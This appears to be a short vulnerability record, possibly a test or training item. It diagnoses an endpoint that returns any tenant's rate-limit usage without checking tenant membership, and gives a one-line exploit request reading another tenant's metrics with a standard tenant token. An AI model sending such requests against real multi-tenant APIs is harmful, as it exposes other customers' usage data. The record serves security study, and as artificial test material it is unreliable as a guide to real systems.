diagnosis: The tenant rate limit usage monitoring endpoint queries rateLimiter.get() using tenantId from the route path without verifying that the authenticated user belongs to that tenant, leaking customer API consumption metrics and traffic volume patterns to competitors.
exploit_request:
GET /api/v1/rate-limits/tenants/org_fintech_premier/usage HTTP/1.1
Host: gateway.api-mesh.com:9002
Authorization: Bearer <standard_tenant_jwt>
